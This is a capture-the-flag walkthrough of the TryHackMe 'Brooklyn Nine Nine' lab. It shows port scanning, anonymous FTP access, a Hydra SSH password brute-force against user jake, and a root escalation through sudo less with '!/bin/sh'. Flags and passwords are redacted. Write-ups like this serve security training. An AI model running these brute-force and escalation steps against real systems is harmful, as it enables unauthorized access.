# Brooklyn Nine Nine

Link to the room: https://tryhackme.com/room/brooklynninenine

## Let's start !!

First, we set an IP variable

````````
export IP=10.10.63.149
````````

### Rustscan 

As always we start with rustscan I like its style and it instantly gives a response after discovering an open port. The drawback is that we cannot scan it for UDP.

````````
rustscan -a $IP -- -A -sC -oN nmap.txt
````````

````````
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.63.149:21
Open 10.10.63.149:22
Open 10.10.63.149:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 00:43 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:43
Completed NSE at 00:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:43
Completed NSE at 00:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:43
Completed NSE at 00:43, 0.00s elapsed
Initiating Ping Scan at 00:43
Scanning 10.10.63.149 [4 ports]
Completed Ping Scan at 00:43, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:43
Completed Parallel DNS resolution of 1 host. at 00:43, 0.06s elapsed
DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 00:43
Scanning 10.10.63.149 [3 ports]
Discovered open port 80/tcp on 10.10.63.149
Discovered open port 21/tcp on 10.10.63.149
Discovered open port 22/tcp on 10.10.63.149
Completed SYN Stealth Scan at 00:43, 0.26s elapsed (3 total ports)
Initiating Service scan at 00:43
Scanning 3 services on 10.10.63.149
Completed Service scan at 00:43, 6.42s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.10.63.149
Retrying OS detection (try #2) against 10.10.63.149
Initiating Traceroute at 00:43
Completed Traceroute at 00:43, 0.25s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 00:43
Completed Parallel DNS resolution of 2 hosts. at 00:43, 0.06s elapsed
DNS resolution of 2 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.63.149.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:43
NSE: [ftp-bounce 10.10.63.149:21] PORT response: 500 Illegal PORT command.
Completed NSE at 00:43, 8.64s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:43
Completed NSE at 00:43, 1.69s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:43
Completed NSE at 00:43, 0.00s elapsed
Nmap scan report for 10.10.63.149
Host is up, received reset ttl 63 (0.20s latency).
Scanned at 2022-05-31 00:43:29 IST for 23s

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.126.243
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQjh/Ae6uYU+t7FWTpPoux5Pjv9zvlOLEMlU36hmSn4vD2pYTeHDbzv7ww75UaUzPtsC8kM1EPbMQn1BUCvTNkIxQ34zmw5FatZWNR8/De/u/9fXzHh4MFg74S3K3uQzZaY7XBaDgmU6W0KEmLtKQPcueUomeYkqpL78o5+NjrGO3HwqAH2ED1Zadm5YFEvA0STasLrs7i+qn1G9o4ZHhWi8SJXlIJ6f6O1ea/VqyRJZG1KgbxQFU+zYlIddXpub93zdyMEpwaSIP2P7UTwYR26WI2cqF5r4PQfjAMGkG1mMsOi6v7xCrq/5RlF9ZVJ9nwq349ngG/KTkHtcOJnvXz
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBItJ0sW5hVmiYQ8U3mXta5DX2zOeGJ6WTop8FCSbN1UIeV/9jhAQIiVENAW41IfiBYNj8Bm+WcSDKLaE8PipqPI=
|   256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP2hV8Nm+RfR/f2KZ0Ub/OcSrqfY1g4qwsz16zhXIpqk
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=5/31%OT=21%CT=%CU=41925%PV=Y%DS=2%DC=T%G=N%TM=62951770%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)
WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW6%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 30.259 days (since Sat Apr 30 18:31:02 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   204.77 ms 10.8.0.1
2   243.21 ms 10.10.63.149

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:43
Completed NSE at 00:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:43
Completed NSE at 00:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:43
Completed NSE at 00:43, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.61 seconds
           Raw packets sent: 65 (4.504KB) | Rcvd: 46 (3.276KB)

````````
So we have 3 ports open 21(FTP) ,22(ssh) ,80(HTTP). First, let's check what is in FTP... 

### FTP

````````
ftp $IP
````````

````````
Connected to 10.10.63.149.
220 (vsFTPd 3.0.3)
Name (10.10.63.149:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||30708|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> mget *
mget note_to_jake.txt [anpqy?]? 
229 Entering Extended Passive Mode (|||24731|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |********************************************************************************************************************************|   119       35.60 KiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (0.48 KiB/s)
ftp> 

````````
Here we found a file called note_to_jake. let us see what is inside. in note_to_jake.txt we found a name, Jake. let's bruteforce it. 

### Hydra (ssh)

````````
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 6
````````

````````
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-31 00:53:23
[DATA] max 6 tasks per 1 server, overall 6 tasks, 14344399 login tries (l:1/p:14344399), ~2390734 tries per task
[DATA] attacking ssh://10.10.63.149:22/
[STATUS] 66.00 tries/min, 66 tries in 00:01h, 14344333 to do in 3622:19h, 6 active
[22][ssh] host: 10.10.63.149   login: jake   password: {REDACTED}
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-05-31 00:55:15

````````
YESS!!! we have successfully bruteforce the password. now let's log in as user jake via ssh...

## Getting First flag (login via ssh)

````````
pwncat-cs jake@$IP
````````

````````
[00:59:36] Welcome to pwncat 🐈!                                                                                                                              __main__.py:164
Password: *********
[00:59:43] 10.10.63.149:22: registered new host w/ db                                                                                                          manager.py:957
(local) pwncat$                                                                                                                                                              
(remote) jake@brookly_nine_nine:/home/jake$ ls
(remote) jake@brookly_nine_nine:/home/jake$ cd ..
(remote) jake@brookly_nine_nine:/home$ ls
amy  holt  jake
(remote) jake@brookly_nine_nine:/home$ cd holt/
(remote) jake@brookly_nine_nine:/home/holt$ ls
nano.save  user.txt
(remote) jake@brookly_nine_nine:/home/holt$ cat user.txt 
{REDACTED}
(remote) jake@brookly_nine_nine:/home/holt$ 

````````
Okey, we have our first flag. now let's escalate our privilege and get root.txt...

## Privilage Esculation 

````````
sudo /usr/bin/less /etc/profile
!/bin/sh
````````

````````
(remote) jake@brookly_nine_nine:/home/holt$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
(remote) jake@brookly_nine_nine:/home/holt$ sudo /usr/bin/less /etc/profile
# cd /root
# ls
root.txt
# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: {REDACTED}

Enjoy!!
# 

````````

- DONE